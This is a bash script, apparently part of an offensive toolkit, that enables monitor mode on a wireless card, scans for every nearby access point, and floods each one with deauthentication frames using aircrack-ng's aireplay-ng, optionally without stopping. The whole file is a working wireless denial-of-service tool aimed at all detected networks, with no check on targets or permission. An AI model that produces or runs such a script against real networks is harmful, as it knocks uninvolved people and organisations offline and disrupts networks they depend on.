#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "DEAUTH — ALL NETWORKS" "broadcast deauth · all detected APs · aircrack-ng suite"

require_tool airmon-ng  "apt install aircrack-ng"
require_tool airodump-ng "apt install aircrack-ng"
require_tool aireplay-ng "apt install aircrack-ng"

outdir="$(make_outdir)"
outfile="$outdir/deauth_all.txt"
: > "$outfile"

# ── Pipeline: skip (requires physical WiFi interaction) ───────────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  printf '  %s[CHAIN]%s WiFi Deauth All requires interactive mode — skipping in pipeline%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  mark_done "$outfile"
  exit 0
fi

TMP_DIR="$(mktemp -d /tmp/deauth_all_XXXXXX)"

# ── Interface selection ────────────────────────────────────────────────────────
section "WIRELESS INTERFACE"

mapfile -t _wifi < <(iw dev 2>/dev/null | awk '/Interface/{print $2}')
if [[ ${#_wifi[@]} -eq 0 ]]; then
  printf '  %s[!]%s No wireless interfaces found%s\n' "${RED}" "${RESET}" "${RESET}"
  exit 1
fi

for i in "${!_wifi[@]}"; do
  printf '  %s[%02d]%s  %s\n' "${CYAN}" "$((i+1))" "${RESET}" "${_wifi[$i]}"
done

printf '\n  %s>>%s Interface [1-%d]: ' "${CYAN}" "${RESET}" "${#_wifi[@]}"
read -r _sel; _sel="${_sel:-1}"

if ! [[ "$_sel" =~ ^[0-9]+$ ]] || (( _sel < 1 || _sel > ${#_wifi[@]} )); then
  printf '  %s[!]%s Invalid selection%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi
IFACE="${_wifi[$((_sel-1))]}"

printf '  %s>>%s Scan duration in seconds [10]: ' "${CYAN}" "${RESET}"
read -r _t; SCAN_TIME="${_t:-10}"

printf '  %s>>%s Deauth packets per AP [15, 0=continuous]: ' "${CYAN}" "${RESET}"
read -r _d; DEAUTH_PACKETS="${_d:-15}"

printf '\n  %s[SYS]%s Interface : %s%s%s\n\n' "${CYAN}" "${RESET}" "${GREEN}" "$IFACE" "${RESET}"
printf 'Interface: %s\n' "$IFACE" >> "$outfile"

# ── Monitor mode ──────────────────────────────────────────────────────────────
section "MONITOR MODE"

printf '  %s[*]%s Enabling monitor mode...%s\n' "${CYAN}" "${RESET}" "${RESET}"
airmon-ng check kill 2>/dev/null | tee -a "$outfile" || true
airmon-ng start "$IFACE" 2>/dev/null | tee -a "$outfile"

MON_IFACE=$(iwconfig 2>/dev/null | grep 'Mode:Monitor' | awk '{print $1}' | head -1)
if [[ -z "$MON_IFACE" ]]; then
  ip link show "${IFACE}mon" &>/dev/null && MON_IFACE="${IFACE}mon" || MON_IFACE="$IFACE"
fi
if ! iw dev "$MON_IFACE" info 2>/dev/null | grep -q "type monitor"; then
  ip link set "$IFACE" down
  iw dev "$IFACE" set type monitor || { printf '  %s[!]%s Monitor mode failed%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1; }
  ip link set "$IFACE" up
  MON_IFACE="$IFACE"
fi

printf '  %s[+]%s Monitor interface: %s%s%s\n\n' "${GREEN}" "${RESET}" "${CYAN}" "$MON_IFACE" "${RESET}"
printf 'Monitor: %s\n' "$MON_IFACE" >> "$outfile"

_restore() {
  printf '\n  %s[*]%s Restoring interface...%s\n' "${CYAN}" "${RESET}" "${RESET}"
  airmon-ng stop "$MON_IFACE" 2>/dev/null || true
  ip link set "$IFACE" down 2>/dev/null
  iw dev "$IFACE" set type managed 2>/dev/null || true
  ip link set "$IFACE" up 2>/dev/null
  rm -rf "$TMP_DIR"
  printf '  %s[+]%s Interface restored.%s\n' "${GREEN}" "${RESET}" "${RESET}"
}
trap '_restore' EXIT

# ── Scan ──────────────────────────────────────────────────────────────────────
section "NETWORK SCAN"

printf '  %s[*]%s Scanning for %ss...%s\n\n' "${CYAN}" "${RESET}" "$SCAN_TIME" "${RESET}"
airodump-ng -w "$TMP_DIR/scan" --output-format csv "$MON_IFACE" &>/dev/null &
_pid=$!
sleep "$SCAN_TIME"
kill "$_pid" 2>/dev/null; wait "$_pid" 2>/dev/null

CSV="$TMP_DIR/scan-01.csv"
if [[ ! -f "$CSV" ]]; then
  printf '  %s[!]%s No scan output found.%s\n' "${RED}" "${RESET}" "${RESET}"; exit 1
fi

mapfile -t NETWORKS < <(
  grep -E "^[0-9A-Fa-f]{2}(:[0-9A-Fa-f]{2}){5}" "$CSV" \
  | awk -F, '{gsub(/ /,"",$1); gsub(/ /,"",$4); if($4!="") print $1","$4}' \
  | sort -u
)

printf '  %s[+]%s %s networks detected\n\n' "${GREEN}" "${RESET}" "${#NETWORKS[@]}"
printf '=== NETWORKS FOUND ===\n' >> "$outfile"

for _net in "${NETWORKS[@]}"; do
  IFS=, read -r _b _ch <<< "$_net"
  printf '  %s[+]%s BSSID: %s%-20s%s  CH: %s\n' \
    "${GREEN}" "${RESET}" "${CYAN}" "$_b" "${RESET}" "$_ch"
  printf '%s CH%s\n' "$_b" "$_ch" >> "$outfile"
done

# ── Deauthentication ──────────────────────────────────────────────────────────
section "DEAUTHENTICATION"

printf '  %s[*]%s Sending %s deauth frames to each AP...%s\n\n' \
  "${CYAN}" "${RESET}" "$DEAUTH_PACKETS" "${RESET}"
printf '=== DEAUTH LOG ===\n' >> "$outfile"

for _net in "${NETWORKS[@]}"; do
  IFS=, read -r BSSID CHANNEL <<< "$_net"
  [[ -z "$BSSID" || -z "$CHANNEL" ]] && continue
  printf '  %s[→]%s %-20s CH%-3s\n' "${CYAN}" "${RESET}" "$BSSID" "$CHANNEL"
  printf 'DEAUTH: %s CH%s\n' "$BSSID" "$CHANNEL" >> "$outfile"
  iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null || true
  aireplay-ng --deauth "$DEAUTH_PACKETS" -a "$BSSID" "$MON_IFACE" 2>/dev/null || true
done

printf '\n  %s[+]%s Deauthentication complete.%s\n' "${GREEN}" "${RESET}" "${RESET}"
printf '\n  %s[SYS]%s Report : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
